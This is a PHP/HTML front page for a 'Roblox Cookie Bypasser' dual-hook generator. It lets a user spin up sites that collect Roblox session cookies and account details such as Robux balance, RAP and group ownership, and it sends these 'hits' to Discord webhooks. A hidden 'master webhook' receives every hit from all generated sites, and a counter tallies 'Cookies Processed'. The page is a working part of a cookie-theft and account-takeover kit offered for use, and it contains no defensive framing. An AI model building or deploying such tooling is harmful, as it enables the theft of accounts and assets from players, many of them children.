<?php
/**
 * Bypasserv3 - Dualhook Generator (No Dashboard)
 * Direct webhook notifications only
 */

require_once '../config.php';
require_once '../functions.php';

$globalStats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Bypasser - Dual Hook Generator</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Outfit', sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0a0e27 100%);
            background-attachment: fixed;
            color: #f8fafc;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
        }
        
        .glass-box {
            backdrop-filter: blur(20px) saturate(200%);
            -webkit-backdrop-filter: blur(20px) saturate(200%);
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(30, 41, 59, 0.6) 100%);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .header-icon {
            font-size: 48px;
            margin-bottom: 16px;
            display: inline-block;
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }
        
        .header h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(90deg, #3b82f6 0%, #60a5fa 50%, #3b82f6 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 200% auto;
            animation: gradientShift 3s ease infinite;
        }
        
        .header p {
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
            margin-bottom: 4px;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% center; }
            50% { background-position: 100% center; }
            100% { background-position: 0% center; }
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .webhook-hint {
            display: inline-block;
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 6px;
            padding: 8px 12px;
            font-size: 11px;
            color: rgba(255, 255, 255, 0.6);
            margin-left: 4px;
            cursor: help;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 10px;
            color: #f8fafc;
            font-size: 14px;
            font-family: 'Outfit', sans-serif;
            transition: all 0.3s ease;
        }
        
        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }
        
        .form-group input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.08);
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        
        .form-group small {
            display: block;
            margin-top: 6px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.5);
        }
        
        .btn-generate {
            width: 100%;
            padding: 14px 20px;
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 16px;
        }
        
        .btn-generate:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
        }
        
        .btn-generate:active {
            transform: translateY(0);
        }
        
        .btn-generate:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .btn-back {
            width: 100%;
            padding: 12px 20px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: white;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        
        .btn-back:hover {
            background: rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.3);
        }
        
        .stats {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid rgba(59, 130, 246, 0.2);
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 4px;
        }
        
        .stat-label {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.6);
        }
        
        .success-container {
            text-align: center;
        }
        
        .success-icon {
            font-size: 64px;
            margin-bottom: 20px;
            animation: bounce 0.6s ease-in-out;
        }
        
        @keyframes bounce {
            0%, 100% { transform: scale(0); }
            50% { transform: scale(1); }
        }
        
        .success-container h2 {
            font-size: 24px;
            margin-bottom: 12px;
            color: #10b981;
        }
        
        .success-container p {
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 8px;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            background: rgba(16, 185, 129, 0.1);
            padding: 12px;
            border-radius: 8px;
            margin-top: 16px;
        }
        
        .webhook-info {
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 10px;
            padding: 12px;
            margin-top: 12px;
            font-size: 11px;
            color: rgba(255, 255, 255, 0.6);
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="formContainer" class="glass-box">
            <div class="header">
                <div class="header-icon"><//>
                <h1>Roblox Cookie Bypasser</h1>
                <h1 style="font-size: 24px; margin-top: -8px;">Dual Hook Generator</h1>
                <p>Create your own Roblox cookie Bypasser site in seconds</p>
            </div>

            <form id="generatorForm" onsubmit="return handleSubmit(event)">
                <!-- Site Name -->
                <div class="form-group">
                    <label>
                        <span>📁</span>
                        Site Name (Directory)
                    </label>
                    <input 
                        type="text" 
                        id="siteName" 
                        placeholder="e.g. myrefresher123"
                        maxlength="32"
                        required
                    />
                    <small>3-32 characters, letters, numbers, hyphens, underscores only</small>
                </div>

                <!-- Master Webhook -->
                <div class="form-group">
                    <label>
                        <span>🔐</span>
                        Master Webhook (Admin)
                        <span class="webhook-hint">?</span>
                    </label>
                    <input 
                        type="text" 
                        id="masterWebhook" 
                        placeholder="https://discord.com/api/webhooks/..."
                        required
                    />
                    <div class="webhook-info">
                        📊 <strong>Receives ALL hits</strong> from all sites you generate. Perfect for tracking all activity across your network.
                    </div>
                </div>

                <!-- User Webhook -->
                <div class="form-group">
                    <label>
                        <span>👤</span>
                        User Webhook (Optional)
                        <span class="webhook-hint">?</span>
                    </label>
                    <input 
                        type="text" 
                        id="userWebhook" 
                        placeholder="https://discord.com/api/webhooks/..."
                    />
                    <div class="webhook-info">
                        🎯 <strong>Receives ONLY hits</strong> from THIS specific site. If not provided, will use master webhook.
                    </div>
                </div>

                <button type="submit" class="btn-generate">
                    <span>⚡</span>
                    Generate Site
                </button>

                <a href="/" class="btn-back">
                    <span>🏠</span>
                    Back to Main Site
                </a>
            </form>

            <div id="successContainer" class="success-container" style="display: none;">
                <div class="success-icon">✅</div>
                <h2>Site Generated Successfully!</h2>
                <p>Your bypass site is ready with FULL EMBED FUNCTIONALITY!</p>
                
                <div style="margin-top: 20px; text-align: left; background: rgba(59, 130, 246, 0.1); padding: 16px; border-radius: 10px; border: 1px solid rgba(59, 130, 246, 0.3);">
                    <p style="font-size: 12px; color: rgba(255, 255, 255, 0.6); margin-bottom: 8px;">📎 Your Link:</p>
                    <p id="generatedUrl" style="background: rgba(0, 0, 0, 0.3); padding: 12px; border-radius: 6px; font-size: 13px; margin: 0; word-break: break-all;"></p>
                </div>

                <div style="margin-top: 20px; text-align: left; background: rgba(59, 130, 246, 0.1); padding: 16px; border-radius: 10px; border: 1px solid rgba(59, 130, 246, 0.3);">
                    <p style="font-size: 12px; color: rgba(255, 255, 255, 0.6); margin-bottom: 8px;">🔔 Webhook Setup:</p>
                    <ul style="font-size: 13px; color: rgba(255, 255, 255, 0.8); list-style: none; padding: 0;">
                        <li style="margin-bottom: 6px;">✓ Master Webhook: Receives ALL hits from all sites</li>
                        <li>✓ User Webhook: Receives ONLY hits from this specific site</li>
                    </ul>
                </div>

                <div style="margin-top: 20px; text-align: left;">
                    <p style="font-size: 12px; color: rgba(255, 255, 255, 0.6); margin-bottom: 8px;">✨ Full Features:</p>
                    <ul style="font-size: 13px; color: rgba(255, 255, 255, 0.8); list-style: none; padding: 0;">
                        <li style="margin-bottom: 6px;">✓ Account info fetching</li>
                        <li style="margin-bottom: 6px;">✓ Robux balance display</li>
                        <li style="margin-bottom: 6px;">✓ RAP value tracking</li>
                        <li style="margin-bottom: 6px;">✓ Limited RAP calculation</li>
                        <li style="margin-bottom: 6px;">✓ Group ownership detection</li>
                        <li style="margin-bottom: 6px;">✓ Friend count display</li>
                        <li>✓ Dual webhook notifications</li>
                    </ul>
                </div>

                <button onclick="window.location.href = document.getElementById('generatedUrl').textContent" class="btn-generate" style="margin-top: 20px;">
                    <span>🚀</span>
                    Open Your Site
                </button>

                <button onclick="location.reload()" class="btn-back">
                    <span>🔄</span>
                    Create Another Site
                </button>
            </div>

            <div class="stats">
                <div class="stat-item">
                    <div class="stat-number"><?= $globalStats['totalInstances'] ?? 0 ?></div>
                    <div class="stat-label">Sites Created</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number"><?= $globalStats['totalCookies'] ?? 0 ?></div>
                    <div class="stat-label">Cookies Processed</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        async function handleSubmit(e) {
            e.preventDefault();

            const siteName = document.getElementById('siteName').value.trim();
            const masterWebhook = document.getElementById('masterWebhook').value.trim();
            const userWebhook = document.getElementById('userWebhook').value.trim();

            if (!siteName || !masterWebhook) {
                Swal.fire({
                    icon: 'error',
                    title: 'Missing Fields',
                    text: 'Please fill in all required fields',
                    background: 'rgba(15, 23, 42, 0.9)',
                    color: '#f8fafc',
                    confirmButtonColor: '#3b82f6'
                });
                return false;
            }

            if (siteName.length < 3) {
                Swal.fire({
                    icon: 'error',
                    title: 'Invalid Site Name',
                    text: 'Site name must be at least 3 characters',
                    background: 'rgba(15, 23, 42, 0.9)',
                    color: '#f8fafc',
                    confirmButtonColor: '#3b82f6'
                });
                return false;
            }

            const btn = document.querySelector('.btn-generate');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div> Generating...';

            try {
                const response = await fetch('/generator/create.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        directory: siteName,
                        masterWebhook,
                        userWebhook
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('formContainer').style.display = 'none';
                    document.getElementById('successContainer').style.display = 'block';
                    document.getElementById('generatedUrl').textContent = data.publicUrl;

                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        html: '<p>Your site has been generated!</p><p style="font-size: 12px; color: #9ca3af; margin-top: 8px;">Webhooks have been notified</p>',
                        background: 'rgba(15, 23, 42, 0.9)',
                        color: '#f8fafc',
                        confirmButtonColor: '#10b981'
                    });
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Error',
                        text: data.error || 'Failed to generate site',
                        background: 'rgba(15, 23, 42, 0.9)',
                        color: '#f8fafc',
                        confirmButtonColor: '#ef4444'
                    });
                }
            } catch (err) {
                Swal.fire({
                    icon: 'error',
                    title: 'Network Error',
                    text: err.message,
                    background: 'rgba(15, 23, 42, 0.9)',
                    color: '#f8fafc',
                    confirmButtonColor: '#ef4444'
                });
            } finally {
                btn.disabled = false;
                btn.innerHTML = '<span>⚡</span> Generate Site';
            }

            return false;
        }
    </script>
</body>
</html>
?>
